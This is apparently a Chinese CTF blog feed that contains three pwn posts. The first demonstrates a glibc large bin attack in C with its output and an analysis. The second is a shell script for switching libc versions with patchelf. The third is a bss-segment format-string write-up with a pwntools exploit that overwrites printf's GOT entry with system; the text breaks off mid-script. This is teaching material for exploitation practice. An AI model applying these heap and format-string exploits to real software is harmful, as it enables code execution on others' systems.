src="https://i.loli.net/2021/07/26/FVNtTrI52nCuzpj.png" alt="s" style="zoom:50%;" /></p><h3 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h3><p>用libc-2.23.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">This technique only works with disabled tcache-option <span class="keyword">for</span> glibc, see glibc_build.sh <span class="keyword">for</span> build instructions.</span><br><span class="line">This file demonstrates large bin attack by writing a large unsigned long value into stack</span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast <span class="keyword">in</span> libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s first look at the targets we want to rewrite on stack:</span></span><br><span class="line"><span class="string">stack_var1 (0x7ffe4c957580): 0</span></span><br><span class="line"><span class="string">stack_var2 (0x7ffe4c957588): 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we allocate the first large chunk on the heap at: 0x55616307d000</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then, we allocate the second large chunk on the heap at: 0x55616307d360</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Finally, we allocate the third large chunk on the heap at: 0x55616307d7a0</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x55616307d360 &lt;--&gt; 0x55616307d000 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x55616307d0a0 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x55616307d7a0 &lt;--&gt; 0x55616307d0a0 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;</span>s <span class="string">&quot;size&quot;</span> as well as its <span class="string">&quot;bk&quot;</span> and <span class="string">&quot;bk_nextsize&quot;</span> pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we <span class="built_in">set</span> <span class="string">&quot;bk&quot;</span> to 16 bytes before stack_var1 and <span class="string">&quot;bk_nextsize&quot;</span> to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span></span><br><span class="line"><span class="string">stack_var1 (0x7ffe4c957580): 0x55616307d7a0</span></span><br><span class="line"><span class="string">stack_var2 (0x7ffe4c957588): 0x55616307d7a0</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>关键代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>我们改掉size使得p2变小，并且改掉bk和bk_nextsize为栈地址</p><p>当我们malloc(0x90)的时候，位于ub的p3会执行如下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     <span class="comment">// p3-&gt;fd_nextsize = p2</span></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     <span class="comment">// p3-&gt;bk_nextsize = p2-&gt;nextsize = 覆写的栈地址(&amp;stack_var2 - 4)</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     <span class="comment">// *(&amp;stack_var2 - 4 + 4) 写入p3</span></span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line"><span class="comment">// bck = (&amp;stack_var1 - 2)</span></span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line"><span class="comment">// p3-&gt;bk = bck = (&amp;stack_var2 - 4)</span></span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line"><span class="comment">// p3-&gt;fd = fwd</span></span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line"><span class="comment">// bck-&gt;fd = *(&amp;stack_var1 - 2 + 2) = p3</span></span><br><span class="line">     bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>借用A1ex师傅博客总结如下：</p><blockquote><ol><li><code>victim</code>（也即<code>unsorted chunk</code>）的<code>size</code>必须大于 <code>largebin chunk</code>，这样才能够绕过<code>else</code>之前的检测；</li><li>控制<code>fwd-&gt;bk_nextsize</code>为<code>target_addr1</code>，那么执行<code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>时，就能控制<code>victim-&gt;bk_nextsize</code>为 <code>traget_addr1</code>;</li><li>接着就能控制 <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>，也就相当于 <code>target_addr1-&gt;fd_nextsize = victim</code>，我们在 <code>*(taget_addr1+0x20)=victim</code> 写入了 <code>unsorted chunk</code>的地址；</li><li>然后，我们修改<code>fwd-&gt;bk</code>为<code>target_addr2</code>，就能控制 <code>bck</code>；</li><li>最后，通过 <code>bck-&gt;fd=victim</code>，就能在 <code>*(target_addr2+0x10)=victim</code>，又写入了 <code>unsortedbin chunk</code>的地址</li></ol><p>总结就是，如果能够控制已经在<code>largebin</code>中的chunk的<code>bk、bk_nextsize</code>字段，那么就能实现往任意地址写入待插入<code>largebin</code>的chunk的地址。一般待插入的<code>chunk</code>地址为堆地址，所以通过<code>largebin attack</code>可以实现往任意地址写入堆地址的目的</p></blockquote><h4 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h4><p>我认为，利用手法很简要，控制largebin中chunk的bk字段为(&amp;target - 2)或者bk_nextsize字段为(&amp;target - 4)，那么target里面将会被写入堆地址，注意size不能相同，fd等位置置0避免进入unlink</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>让我先找找看2333</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> largebin attack </tag>
            
            <tag> ptmalloc2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell脚本 + patchelf方便切换libc</title>
      <link href="2021/07/23/switch-libc/"/>
      <url>2021/07/23/switch-libc/</url>
      
        <content type="html"><![CDATA[<h2 id="更便捷切换libc"><a href="#更便捷切换libc" class="headerlink" title="更便捷切换libc"></a>更便捷切换libc</h2><p>目前自己的切换libc的方法是用<code>patchelf --set-interpreter</code>换ld文件 + <code>LD_PRELOAD</code>换libc<br>并且我的libc都在/glibc/目录下<br><img src="https://i.loli.net/2021/07/23/nwqIE4P7WOvmsj2.png" alt=""></p><p>于是感觉有点麻烦，遂写了个shell脚本，主要是省略了路径上的困难<br>思路就是case语句判断是哪个版本的，然后判断是32还是64位的，还要加上一个—help<br>思路有点死板，路径啥的被我写死了（x</p><p>目前没发现啥问题<br><img src="https://i.loli.net/2021/07/23/mk6QuJPaZO5134F.png" alt=""><br><img src="https://i.loli.net/2021/07/23/V19xLjUle4yrXRF.png" alt=""></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/zsh</span></span><br><span class="line"></span><br><span class="line">if [[ $1 = &quot;--help&quot; ]] || [[ $1 = &quot;-h&quot; ]] || [[ $1 = &quot;&quot; ]]</span><br><span class="line">then</span><br><span class="line">    echo &quot;--------------------&quot;</span><br><span class="line">    echo &quot;arg1: libc版本&quot;</span><br><span class="line">    echo &quot;arg2: 32 or 64&quot;</span><br><span class="line">    echo &quot;arg3: binary path&quot;</span><br><span class="line">    echo &quot;such as: sl 2.23 64 ./pwn&quot;</span><br><span class="line">    echo &quot;--------------------&quot;</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">message=&quot;请查看帮助 -h (--help)&quot;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">&quot;2.23&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.23-0ubuntu11.3_i386/ld-2.23.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.27&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.27-3ubuntu1.2_i386/ld-2.27.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.27-3ubuntu1.2_i386/libc-2.27.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.29&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.29/64/lib/ld-2.29.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.29/64/lib/libc-2.29.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.29/32/lib/ld-2.29.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.29/32/lib/libc-2.29.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.31&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.31/64/lib/ld-2.31.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.31/64/lib/libc-2.31.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.31/32/lib/ld-2.31.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.31/32/lib/libc-2.31.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo $message</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">figlet -f small &quot;Switch the  libc&quot;</span><br><span class="line">echo -e &quot;\033[1;32mld-path:$ld\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[1;32mlibc-path:$libc\033[0m&quot;</span><br><span class="line">figlet -f small &quot;Switch the  libc&quot;</span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter $ld $3</span><br><span class="line">LD_PRELOAD=$libc $3</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bss段上格式化字符串的利用手法</title>
      <link href="2021/07/19/format-bss/"/>
      <url>2021/07/19/format-bss/</url>
      
        <content type="html"><![CDATA[<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>bss段上的利用手法与栈不同，因为不能向栈中直接写入数据了</p><p>利用手法是一个间接写入的思想</p><p>用C’代替C，C’和C相似</p><blockquote><p>A -&gt; B -&gt; C</p><p>A -&gt; B -&gt; C’</p></blockquote><p>常见利用手法：</p><ul><li>改ret地址中的__libc_start_main改为one_gadget</li><li>改printf的got为system</li></ul><h2 id="SWPUCTF-2019-login"><a href="#SWPUCTF-2019-login" class="headerlink" title="SWPUCTF_2019_login"></a>SWPUCTF_2019_login</h2><p>一个典型的bss段上的格式化字符串，可以无限输入</p><p>因为checksec后发现got表可写，思路就是将printf@got的内容改为system，然后输入/bin/sh即可getshell</p><p>步骤分三步：</p><ol><li>找到第一个跳板，将其改为printf@got</li><li>找到第二个跳板，将其改为printf@got + 2</li><li>一次性将printf@got的后四位改为system的后四位，将printf@got + 2的后两位改为system&gt;&gt;16的后两位</li></ol><p>前两步又分为两个小步，现将中间过程截图如下：</p><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><blockquote><p>找到第一个跳板</p></blockquote><p><img src="https://i.loli.net/2021/07/21/LOzf9NEIjK7spCo.png" alt=""></p><blockquote><p>将第一个跳板改为printf@got</p></blockquote><p><img src="https://i.loli.net/2021/07/21/snqPy763Dl8pdBH.png" alt=""></p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>（同step1）</p><p>完成前两步后，最终效果如下所示</p><p><img src="https://i.loli.net/2021/07/21/keJgx3hBKsY9OcZ.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./SWPUCTF_2019_login&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../32-libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params"> payload</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># %15$p</span></span><br><span class="line">    <span class="comment"># %21$p</span></span><br><span class="line">    ru(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;lemon&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please input your password:&quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;%15$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base=<span class="number">16</span>) - <span class="number">241</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    fmt(<span class="string">&quot;%21$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base=<span class="number">16</span>)</span><br><span class="line">    target = stack - <span class="number">0x90</span></span><br><span class="line">    echo(<span class="string">&quot;target:&quot;</span> + <span class="built_in">hex</span>(target))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    offset = -<span class="number">0x30</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((target + offset) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    fmt(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x90</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((elf.got[<span class="string">&quot;printf&quot;</span>]) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset // <span class="number">4</span>) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    offset = -<span class="number">0x38</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((target + offset) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    fmt(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x90</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((elf.got[<span class="string">&quot;printf&quot;</span>] + <span class="number">2</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset // <span class="number">4</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    sd(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># attack</span></span><br><span class="line">    offset1 = -<span class="number">0x30</span>     <span class="comment"># got</span></span><br><span class="line">    offset2 = -<span class="number">0x38</span>     <span class="comment"># got + 2</span></span><br><span class="line">    echo(<span class="string">&quot;system:&quot;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>])) </span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((libc.sym[<span class="string">&quot;system&quot;</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset2 // <span class="number">4</span>) + <span class="string">&quot;$hhn&quot;</span> </span><br><span class="line">    temp = (libc.sym[<span class="string">&quot;system&quot;</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((libc.sym[<span class="string">&quot;system&quot;</span>] &amp; <span class="number">0xffff</span>) - temp) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset1 // <span class="number">4</span>) + <span class="string">&quot;$hn&quot;</span> </span><br><span class="line">    sd(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span 